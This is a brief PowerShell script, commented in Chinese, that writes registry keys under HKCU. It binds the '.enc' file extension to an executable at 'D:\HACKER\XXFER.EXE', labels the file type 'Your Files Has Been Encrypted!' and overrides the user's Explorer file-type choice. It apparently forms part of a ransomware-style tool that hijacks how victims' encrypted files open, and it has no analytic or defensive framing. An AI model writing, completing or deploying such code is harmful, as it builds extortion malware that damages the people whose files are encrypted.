$extension = ".enc"
$applicationPath = "D:\HACKER\XXFER.EXE"
$applicationProgID = "filenc"  # 为你的应用程序指定一个独特的ProgID

# 创建ProgID注册表项
$progIDPath = "HKCU:\Software\Classes\$applicationProgID"
New-Item -Path $progIDPath -Force | Out-Null
Set-ItemProperty -Path $progIDPath -Name "(default)" -Value "Your Files Has Been Encrypted!"

# 设置应用程序可执行路径
$commandPath = "$progIDPath\shell\open\command"
New-Item -Path $commandPath -Force | Out-Null
Set-ItemProperty -Path $commandPath -Name "(default)" -Value "`"$applicationPath`" `"%1`""

# 将文件扩展名关联到ProgID
$extensionPath = "HKCU:\Software\Classes\$extension"
New-Item -Path $extensionPath -Force | Out-Null
Set-ItemProperty -Path $extensionPath -Name "(default)" -Value $applicationProgID

# 更新UserChoice（适用于Windows 10及以上版本）
$userChoicePath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\$extension\UserChoice"
New-Item -Path $userChoicePath -Force | Out-Null
Set-ItemProperty -Path $userChoicePath -Name "Progid" -Value $applicationProgID
